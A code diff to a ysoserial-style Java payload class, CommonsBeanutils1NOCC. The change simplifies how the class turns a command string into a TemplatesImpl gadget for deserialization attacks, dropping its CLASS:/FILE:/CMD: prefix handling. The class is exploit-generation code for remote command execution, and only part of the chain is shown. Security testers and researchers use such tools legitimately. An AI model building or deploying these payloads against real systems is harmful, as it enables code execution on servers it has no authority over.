@@ -1,14 +1,12 @@
 package ysoserial.payloads;
 
 import org.apache.commons.beanutils.BeanComparator;
-import org.apache.wicket.util.file.Files;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
-import java.io.File;
 import java.util.PriorityQueue;
 
 @SuppressWarnings({"rawtypes", "unchecked"})
@@ -26,24 +24,7 @@ public class CommonsBeanutils1NOCC implements ObjectPayload<Object> {
     }
 
     public Object getObject(final String command) throws Exception {
-        final Object template;
-        Class<?> clazz;
-        try {
-            if (command.startsWith("CLASS:")) {
-                clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6));
-                template = Gadgets.createTemplatesImpl(clazz);
-            } else if (command.startsWith("FILE:")) {
-                byte[] bytes = Files.readBytes(new File(command.substring(5)));
-                template = Gadgets.createTemplatesImpl(bytes);
-            } else if (command.startsWith("CMD:")) {
-                template = Gadgets.createTemplatesImpl(command.substring(4));
-            } else {
-                throw new UnsupportedOperationException("参数语法不支持,请看readme.");
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-            return 0;
-        }
+        final Object template = Gadgets.createTemplatesImpl(command);
         // mock method name until armed
         final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
 
